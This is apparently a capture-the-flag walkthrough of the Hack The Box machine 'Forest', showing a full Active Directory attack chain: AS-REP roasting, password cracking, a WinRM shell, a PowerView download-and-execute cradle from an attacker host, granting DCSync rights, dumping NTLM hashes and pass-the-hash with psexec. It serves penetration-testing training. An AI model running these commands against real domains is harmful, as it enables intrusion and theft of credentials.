# Machine Overview
Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with **Kerberos pre-authentication** disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to **privileged Exchange groups**. The Exchange group membership is leveraged to gain **DCSync** privileges on the domain and dump the NTLM hashes.

## Enumeration through Nmap
First of all we will go with nmap to scan the whole network and check for services running on the network. To scan the whole network and find all the open ports i use **-p-** with **--min-rate 10000** to scan network faster from **nmap** and i found a list of open ports on the network
![alt text](<Pasted image 20240103225607.png>)

Let's filter these ports and check for services running on them. To filter out these ports, I used two different utilities, tr and cut in Kali. tr is used to replace words, and cut is used to extract specific content from the file. The command I used to filter out open ports is cat nmap.txt | cut -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','.
![alt text](<Pasted image 20240103225839.png>)
Now, let's run the service check on these specific ports using nmap -p88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49682,49694,49711 -sCV -A -T4 10.10.10.161 -oN scan.txt.

## Information Gathering
Through Nmap we found port 53 **DNS** is open which can be used to perform zone transfer, 88 **kerberose** is open which can be used to for enumeration purpose here, 139 & 445 **SMB** ports are open and can be used to enumerate shares with anonymous user for initial access, 389 **ldap** port is open, **5985 winrm** port is opened which can be used to login into machine if somehow we managed to obtain a valid credentials. Nmap discover Doamin name by using ldap scripts which is **htb.local**. Let's add this to our local DNS file called `/etc/hots` so that our computer can resolve this domain. 

```bash
echo "10.10.10.161   htb.local" | sudo tee -a /etc/hosts
```

### SMB 139 & 445
**Server Message Block** (SMB) is a network file-sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. It is commonly used in Windows environments for sharing `files, printers`, and other resources.

`smbclient` is a command-line tool that allows you to access and interact with servers that use the Server Message Block (SMB) protocol.
```bash
smbclient -L 10.10.10.161
```

-  **-L** is used to list all the shares

![alt text](<Pasted image 20231130195233.png>)
  
We successfully logged in using anonymous credentials to SMB but didn't find any shares. Since anonymous login is enabled, we can enumerate the domain using **[enum4linux](https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/)**.

[enum4linux](https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/) is a Linux utility used for enumerating information from **Windows** and **Samba** systems. It is designed to extract valuable information during the post-exploitation phase of penetration testing or security assessments. The tool is particularly useful for **gathering information** about `shares, users, and other details from SMB (Server Message Block) servers.` You can use [enum4linux](https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/) -h for its help menu.

```bash
enum4linux -d -r -o 10.10.10.161
```

- **-d** is for detailed user and share list enumeration
-  **-r** is for enumerating users via RID cycling
- **-o** is for OS information

We got the domain **SID** (Security Identifier), which we can use to perform **Silver ticket** or **Golden Ticket** attacks and some usernames.
	**SID (Security Identifier):** SIDs are a component of a security database that security authorities can use **to identify the user and the permissions that user is entitled to**. When users log on to a Windows system, the system generates an access token that includes the user SID, the SID of any groups the user belongs to, and the user privilege level. `S-1-5-21-3072663084-364016917-1341370565`

![alt text](<Pasted image 20230720231239.png>)

Lets save these names in a file.
### 389 LDAP
We will use the tool **ldapsearch** to enumerate the domain LDAP service. **ldapsearch** is a command-line tool that **opens a connection to an LDAP server, binds to it, and performs a search using a filter**. The results are then displayed in the LDIF. The LDIF is used to represent LDAP entries in a simple text format. **ldapsearch** is similar to **enum4linux** but focuses on LDAP (lightweight directory access protocol).

```bash
ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.10.10.161 | grep userPrincipalName
```

- **-x** is for simple authentication.
- **-H** is for defining the host.
- `*` is used to enumerate all user's attributes.
- **-b** is for the base DN for the search.
- **grep userPrincipalName** to get the user's list present in the domain

The Base DN is the starting point an LDAP server uses when searching for users authentication within Active Directory. Example: **DC=example-domain,DC=com.

 The **userPrincipalName** (UPN) is the most common logon name for Windows users. Users typically use their UPN to log on to a domain. This attribute is an indexed string that is single-valued.

## Exploitation
### As-Reproasting Attack
Now that we have a valid username, we can try an **AS-Rep Roasting** attack to check if any of the users have **Does not require Pre-Authentication** enabled.

**AS-REP Roasting** is a technique that allows attackers to steal the password hashes of user accounts with **Kerberos preauthentication** disabled. If preauthentication is disabled, an attacker could request authentication data for any user, and the Domain Controller (DC) would return an **AS-REP** message. Since part of that message is **encrypted** using the user’s password, the attacker can then attempt to brute-force the user’s password offline.

```bash
GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile user1.txt -format john -outputfile hashes
```

- **-dc-ip** is used to set the domain IO.
- **-users-file** is for providing a list of users.
- **-format john** is to get password hashes in the john hash format.
- **-outputfile** is to specify the file to store hashes.

We found a user with a hash, Let's proceed to crack it.

![alt text](<Pasted image 20230720224514.png>)

#### John The Ripper
**John the Ripper** is a free password cracking  tool. Originally developed for the Unix operating system, it can run on fifteen different platforms (eleven of which are architecture-specific versions of **Unix**, **DOS**, **Win32**, **BeOS**, and **OpenVMS**). It is among the most frequently used password testing and breaking programs as it combines a number of password crackers into one package, autodetects password **hash** types, and includes a customizable cracker. It can be run against various encrypted password formats.
Lets use **john the ripper** to crack **svc-alfresco** user password. John The Ripper crack it within a minute.

```bash
john hash -w=/usr/share/wordlists/rockyou.txt
```

#### Shell using Evil-Winrm
**Evil-WinRM** is an open-source, command-line-based tool that provides remote shell access to Windows machines over **WinRM** (Windows Remote Management). **Evil-WinRM** exploits weak configurations present in the WinRM service to establish a remote shell session on a targeted windows machine, allowing the attacker to perform administrative tasks and run scripts

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

- **-i** for domain IP address
- **-u** for for user name
- **-p** for password

# Privilege Escalation
## Domain analysis using BloodHound
Bloodhound is a tool that is generally used by **attackers to visually map an organization’s Active Directory structure and analyze it to find its weaknesses**. It uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify

```bash
bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 --zip
```

- **-c** for collection
- **-u** for user name
- **-p** for user password
- **-d** for domain name
- **-ns** for name server
- **--zip** for creation of a zip file of all the gathered data

![alt text](<Pasted image 20230722140546.png>)
  
This creates a JSON file. Let's upload it to BloodHound to visualize the data. For comprehensive domain enumeration, we can also utilize **SharpHound**, an investigator designed to gather information throughout the domain. **SharpHound** is particularly useful for reconnaissance. Execute `./SharpHound.exe --CollectionMethods All`. Once completed, download the results to your local machine, run BloodHound, upload the data, and commence investigation on the graphs.

![alt text](<Pasted image 20240104000743.png>)
![alt text](<Pasted image 20240104000824.png>)

To run Bloodhound we first need to start **neo4j** a graph database system. 

![alt text](<Pasted image 20240109135359.png>)

Now, type `bloodhound` in a new terminal and press Enter to start BloodHound. If you are running BloodHound for the first time, you need to reset the default credentials, which are `neo4j:neo4j`. After logging into BloodHound, upload the zip file created by **SharpHound**. You can use either method – drag and drop the file into BloodHound or use the "Upload Data" button. Wait for the data to upload into the database.

![alt text](<Pasted image 20240109135829.png>)

After successfully uploading the data, the investigation part begins. Mark the **svc_alfresco** user as owned by right-clicking on it and selecting **Mark user as Owned**.

![alt text](<Pasted image 20240104001028.png>)

Now in Analysis tab Select **Shortest Path -> Shortest Path to Domain Admins From owned Principals**

![alt text](<Pasted image 20240104001106.png>)

  
Let's see if we can find any useful principals.

![alt text](<Pasted image 20240104001403.png>)

Let me explain the graph to you. 
- We owned svc_alfresco user
- **svc_alfresco** is a member of Service Account group
- **Service account group** is a member of Privileged IT Accounts group
- **Privileged IT Accounts group** are member of group Account Operator
- Account Operator have **Generic ALL** permissions on Enterprise Key Admins group
- Enterprise Key Admin have write to **AddKeyCredientialLink** to Domain
  
So, here is a summary: **svc_alfresco** is a member of the Service account group, which is a member of Privileged IT Account, and which is a member of the Account Operator Group. This implies that we can create new users in the domain. Consequently, our user, svc_alfresco, is also a member of the Account Operator Group, which has **Generic All** rights on the Domain Key Admins group. This allows us to add our new user to that Key Admins group. In the end, the Enterprise Key Admins have the **AddKeyCredentialLink** write over the Domain, which we can use to perform a **Shadow Credentials** attack.

We can't gain admin access through a Shadow Credentials attack because it can only be used for persistence. So, I decided to check **Transitive Object Control** (the number of objects this user can gain control of by performing ACL-only based attacks in Active Directory). In other words, it represents the maximum number of objects the user can control without needing to pivot to any other system in the network, just by manipulating objects in the directory.

By exploring **Transitive Object Control**, I discovered that the **Privileged IT Account** group has access to the **Account Operator Group**, and the **Account Operator group** has **GenericAll** writes on the **Exchange Windows Permissions** group, which, in turn, has **WriteDacl** write on the Domain.
![alt text](<Pasted image 20240107145103.png>)
So, we need to create an account and add it to the **Exchange Windows Permissions** group using **GenericAll** writes, and then grant it **DcSync** permissions through the **WriteDacl** write. We can create a user in the Domain because we have access to the **Account Operator Group**. Let's proceed by creating a user and adding it to Windows Exchange Permissions.

```
net user 'admin' 'password' /add /domain
net group 'Exchange Windows Permissions' 'admin' /add /domain
```

![alt text](<Pasted image 20240107150202.png>)

Now, we just need to grant **DcSync** permissions to our user. For **Dacl** abuse, we can refer to [hackerrecipes](https://www.thehacker.recipes/a-d/movement/dacl). Let's proceed to exploit it.

```powershell
# give DcSync write using PowerView
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.25:8000/PowerView.ps1')

$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\admin', $SecPassword)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity admin -Rights DCSync
```

![alt text](<Pasted image 20240107153113.png>)

### DcSyns using Secretsdump.py
Now, let's perform a **DcSync** attack using **secretsdump.py** from the Impacket toolkit 
**SecretsDump.py** is a Python tool by Impacket that can extract secrets from targets. **SecretsDump.py** performs various techniques to dump hashes from the remote machine without executing any agent there. For **SAM** and **LSA** Secrets (including cached creds) it tries to read as much as it can from the **registry** and then saves the hives in the target system `(%SYSTEMROOT%\Temp dir)` and reads the rest of the data from there. For **NTDS.dit** it uses the **Volume Shadow Copy Service** to read NTDS.dit directly from the disk or it can use the parser module to read NTDS.dit files from a copy.
```bash
secretsdump.py -dc-ip 10.10.10.161 htb.local/admin:password@10.10.10.161
```
`Administrator:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`

![alt text](<Pasted image 20240107153217.png>)

#### Pass-the-hash
Now, we just need to perform a **Pass-The-Hash** attack to log in to the Administrator account using **PsExec**. 
PsExec is a **light-weight telnet-replacement** that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software.

```bash
psexec.py htb.local/Administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'
``` 

And we own domain Administrator.
